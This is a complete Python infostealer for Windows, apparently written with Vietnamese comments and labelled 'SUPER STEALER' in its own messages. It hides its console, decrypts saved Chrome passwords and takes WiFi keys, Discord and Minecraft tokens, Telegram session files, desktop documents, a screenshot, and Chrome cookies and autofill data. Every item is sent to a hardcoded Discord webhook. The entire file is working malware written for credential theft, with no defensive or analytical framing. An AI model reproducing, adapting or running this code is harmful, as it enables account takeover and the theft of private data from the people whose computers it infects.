import os
import json
import base64
import sqlite3
import shutil
import requests
import subprocess
import sys
import ctypes
import re
import zipfile
from datetime import datetime

# ==================== ẨN CONSOLE ====================
if getattr(sys, 'frozen', False):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ==================== WEBHOOK ====================
WEBHOOK = "https://discord.com/api/webhooks/1487633660386742402/kpbrjzvaYLbaYiPJYEcAhpnpyul9wrXmpOS2fV4Mbq1xx9Yc73_Pmiq1A2bt0Djaetxt"

# ==================== GỬI DỮ LIỆU ====================
def send(msg):
    try:
        for i in range(0, len(msg), 1900):
            requests.post(WEBHOOK, json={"content": msg[i:i+1900]}, timeout=10)
    except:
        pass

def send_file(filepath, filename):
    try:
        with open(filepath, 'rb') as f:
            requests.post(WEBHOOK, files={"file": (filename, f)}, timeout=15)
        return True
    except:
        return False

# ==================== GIẢI MÃ CHROME (DÙNG BẢN ĐƠN GIẢN) ====================
def get_chrome_key():
    """Lấy key từ Chrome Local State"""
    try:
        local_state = os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Local State")
        if not os.path.exists(local_state):
            return None
        with open(local_state, 'r', encoding='utf-8') as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        # Dùng DPAPI
        import win32crypt
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except:
        return None

def decrypt_chrome_password(encrypted_pwd, key):
    """Giải mã password Chrome"""
    try:
        from Crypto.Cipher import AES
        nonce = encrypted_pwd[3:15]
        ct = encrypted_pwd[15:-16]
        tag = encrypted_pwd[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ct, tag)
        return decrypted.decode('utf-8')
    except:
        return "[Cannot decrypt]"

def get_chrome_passwords_decrypted():
    """Lấy và giải mã toàn bộ password Chrome"""
    db_path = os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(db_path):
        return []
    
    # Lấy key
    key = get_chrome_key()
    if not key:
        return []
    
    temp = os.path.expandvars(r"%temp%\chrome_login.db")
    shutil.copy2(db_path, temp)
    
    results = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for url, username, encrypted_pwd in cursor.fetchall():
        if username and encrypted_pwd:
            password = decrypt_chrome_password(encrypted_pwd, key)
            results.append({
                "url": url,
                "username": username,
                "password": password
            })
    
    conn.close()
    os.remove(temp)
    return results

# ==================== THÔNG TIN HỆ THỐNG ====================
def get_system_info():
    hostname = os.getenv('COMPUTERNAME', 'Unknown')
    username = os.getenv('USERNAME', 'Unknown')
    try:
        ip = subprocess.check_output('curl -s ifconfig.me', shell=True).decode().strip()
    except:
        ip = "Unknown"
    return f"""💻 **SYSTEM INFO**
🖥️ PC: {hostname}
👤 User: {username}
🌐 IP: {ip}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

# ==================== MINECRAFT ====================
def get_minecraft():
    path = os.path.expandvars(r"%appdata%\.minecraft\launcher_accounts.json")
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            results = []
            for uuid, acc in data.get('accounts', {}).items():
                results.append(f"""🎮 **MINECRAFT**
Username: {acc.get('username', 'Unknown')}
Email: {acc.get('email', 'No email')}
Token: {acc.get('accessToken', 'No token')[:80]}...""")
            return results
        except:
            pass
    return []

# ==================== WIFI ====================
def get_wifi():
    results = []
    try:
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, encoding='utf-8', stderr=subprocess.DEVNULL)
        for line in profiles.split('\n'):
            if ':' in line and 'All User Profile' in line:
                name = line.split(':')[1].strip()
                try:
                    data = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True, encoding='utf-8', stderr=subprocess.DEVNULL)
                    for p in data.split('\n'):
                        if 'Key Content' in p:
                            pwd = p.split(':')[1].strip()
                            results.append(f"📶 {name} → {pwd}")
                except:
                    pass
    except:
        pass
    return results

# ==================== DISCORD TOKENS ====================
def get_discord_tokens():
    tokens = []
    paths = [
        os.path.expandvars(r"%appdata%\Discord\Local Storage\leveldb"),
        os.path.expandvars(r"%appdata%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%appdata%\discordptb\Local Storage\leveldb")
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            tokens.extend(found)
            except:
                pass
    return list(set(tokens))

# ==================== TELEGRAM SESSION ====================
def get_telegram():
    tdata = os.path.expandvars(r"%appdata%\Telegram Desktop\tdata")
    if os.path.exists(tdata):
        zip_path = os.path.expandvars(r"%temp%\telegram_tdata.zip")
        try:
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for root, dirs, files in os.walk(tdata):
                    for file in files:
                        zipf.write(os.path.join(root, file), file)
            send_file(zip_path, "telegram_session.zip")
            os.remove(zip_path)
            return "📱 Telegram session files sent"
        except:
            pass
    return None

# ==================== DESKTOP FILES ====================
def get_desktop_files():
    desktop = os.path.expandvars(r"%userprofile%\Desktop")
    files = []
    if os.path.exists(desktop):
        for f in os.listdir(desktop):
            if os.path.isfile(os.path.join(desktop, f)) and f.endswith(('.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.xlsx', '.zip')):
                files.append(f)
        if files:
            zip_path = os.path.expandvars(r"%temp%\desktop_files.zip")
            try:
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    for f in files[:20]:
                        zipf.write(os.path.join(desktop, f), f)
                send_file(zip_path, "desktop_files.zip")
                os.remove(zip_path)
                return f"📁 Desktop: {len(files)} files (zip sent)"
            except:
                pass
    return None

# ==================== SCREENSHOT ====================
def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        path = os.path.expandvars(r"%temp%\screenshot.png")
        screenshot.save(path)
        send_file(path, "screenshot.png")
        os.remove(path)
        return "📸 Screenshot captured"
    except:
        return None

# ==================== COOKIES ====================
def get_cookies():
    cookie_path = os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Cookies")
    if os.path.exists(cookie_path):
        send_file(cookie_path, "chrome_cookies.db")
        return "🍪 Chrome cookies sent"
    return None

# ==================== AUTOFILL ====================
def get_autofill():
    webdata = os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Web Data")
    if os.path.exists(webdata):
        send_file(webdata, "chrome_autofill.db")
        return "📝 Chrome autofill sent"
    return None

# ==================== PHÂN LOẠI TÀI KHOẢN ====================
def classify_account(url):
    url_lower = url.lower()
    if 'google' in url_lower or 'gmail' in url_lower:
        return 'GOOGLE'
    elif 'roblox' in url_lower:
        return 'ROBLOX'
    elif 'microsoft' in url_lower or 'live' in url_lower or 'outlook' in url_lower:
        return 'MICROSOFT'
    elif 'facebook' in url_lower:
        return 'FACEBOOK'
    elif 'instagram' in url_lower:
        return 'INSTAGRAM'
    elif 'twitter' in url_lower or 'x.com' in url_lower:
        return 'TWITTER'
    elif 'discord' in url_lower:
        return 'DISCORD'
    elif 'spotify' in url_lower:
        return 'SPOTIFY'
    elif 'netflix' in url_lower:
        return 'NETFLIX'
    elif 'amazon' in url_lower:
        return 'AMAZON'
    elif 'paypal' in url_lower:
        return 'PAYPAL'
    elif 'github' in url_lower:
        return 'GITHUB'
    elif 'steam' in url_lower:
        return 'STEAM'
    elif 'epicgames' in url_lower:
        return 'EPIC GAMES'
    elif 'minecraft' in url_lower:
        return 'MINECRAFT'
    else:
        return 'OTHER'

# ==================== MAIN ====================
def main():
    send("🔍 **STARTING SUPER STEALER...**")
    
    # Thông tin máy
    send(get_system_info())
    
    # Lấy và giải mã Chrome passwords
    send("🔑 **Decrypting Chrome passwords...**")
    chrome_pass = get_chrome_passwords_decrypted()
    
    if chrome_pass:
        # Phân loại và nhóm
        categories = {}
        for acc in chrome_pass:
            cat = classify_account(acc['url'])
            if cat not in categories:
                categories[cat] = []
            categories[cat].append(f"🔗 {acc['url']}\n📧 {acc['username']}\n🔑 `{acc['password']}`")
        
        # Gửi từng loại
        for cat, data in categories.items():
            if data:
                send(f"**{cat} ACCOUNTS ({len(data)})**\n\n" + "\n\n".join(data[:15]))
        
        # Gửi file JSON full
        with open(os.path.expandvars(r"%temp%\all_passwords.json"), 'w', encoding='utf-8') as f:
            json.dump(chrome_pass, f, indent=2, ensure_ascii=False)
        send_file(os.path.expandvars(r"%temp%\all_passwords.json"), "all_passwords.json")
        
        send(f"✅ Total Chrome passwords: {len(chrome_pass)}")
    else:
        send("❌ Cannot decrypt Chrome passwords (may need admin rights)")
    
    # Minecraft
    mc = get_minecraft()
    if mc:
        for m in mc:
            send(m)
    
    # WiFi
    wifi = get_wifi()
    if wifi:
        send("📡 **WIFI PASSWORDS**\n" + "\n".join(wifi))
    
    # Discord tokens
    discord_tokens = get_discord_tokens()
    if discord_tokens:
        send("💬 **DISCORD TOKENS**\n" + "\n".join([f"`{t}`" for t in discord_tokens[:5]]))
    
    # Telegram
    tg = get_telegram()
    if tg:
        send(tg)
    
    # Desktop files
    desktop = get_desktop_files()
    if desktop:
        send(desktop)
    
    # Screenshot
    ss = take_screenshot()
    if ss:
        send(ss)
    
    # Cookies
    cookies = get_cookies()
    if cookies:
        send(cookies)
    
    # Autofill
    autofill = get_autofill()
    if autofill:
        send(autofill)
    
    send("✅ **COLLECTION COMPLETE!**")

if __name__ == "__main__":
    main()